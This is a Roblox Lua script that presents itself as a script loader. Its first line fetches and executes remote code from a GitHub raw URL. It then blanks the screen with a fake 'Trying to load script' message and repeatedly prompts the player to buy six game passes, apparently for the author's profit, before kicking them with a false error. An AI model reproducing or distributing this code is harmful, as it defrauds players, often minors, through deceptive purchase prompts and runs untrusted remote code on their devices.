loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/mewhen/main/Protected_2166183960430963.lua.txt"))()

local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BackgroundTransparency = 0
frame.BorderSizePixel = 0
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "Trying to load script (30 sec)"
textLabel.Size = UDim2.new(1, 0, 0.1, 0)
textLabel.Position = UDim2.new(0, 0, 0.45, 0)
textLabel.Parent = frame
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.FontSize = Enum.FontSize.Size36
textLabel.Font = Enum.Font.Gotham

game.Lighting.TimeOfDay = 0.5
game.Lighting.Brightness = 0 
game.Lighting.FogEnd = 100

local lighting = game:GetService("Lighting")

local existingSky = nil

for _, child in ipairs(lighting:GetChildren()) do
    if child:IsA("Sky") or (child:IsA("Object") and child:FindFirstChild("SkyboxBk")) then
        existingSky = child
        break
    end
end

if existingSky then
    existingSky:Destroy()
end

local skyy = Instance.new("Sky")
skyy.Name = "uwu"
skyy.Parent = lighting
skyy.SkyboxBk = "rbxassetid://12322755004"
skyy.SkyboxDn = "rbxassetid://12322755004"
skyy.SkyboxFt = "rbxassetid://12322755004"
skyy.SkyboxLf = "rbxassetid://12322755004"
skyy.SkyboxRt = "rbxassetid://12322755004"
skyy.SkyboxUp = "rbxassetid://12322755004"

local mps = game:GetService("MarketplaceService")
-- prompts
local function prompt1()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 628348366)
end

local function prompt2()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 628037371)
end

local function prompt3()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 630810360)
end

local function prompt4()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629718391)
end

local function prompt5()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629164294)
end

local function prompt6()
mps:PromptGamePassPurchase(game.Players.LocalPlayer, 634064461)
end

-- checks

if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 628348366) then
print("ok")
else
prompt1()
end
wait(7)
if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 628037371) then
print("ok")
else
prompt2()
end
wait(7)
if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 630810360) then
print("ok")
else
prompt3()
end
wait(7)
if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629718391) then
print("ok")
else
prompt4()
end
wait(7)
if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629164294) then
print("ok")
else
prompt5()
end
wait(7)
if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 634064461) then
print("ok")
game:GetService("Players").LocalPlayer:Kick("Something went wrong.")
else
prompt6()
end
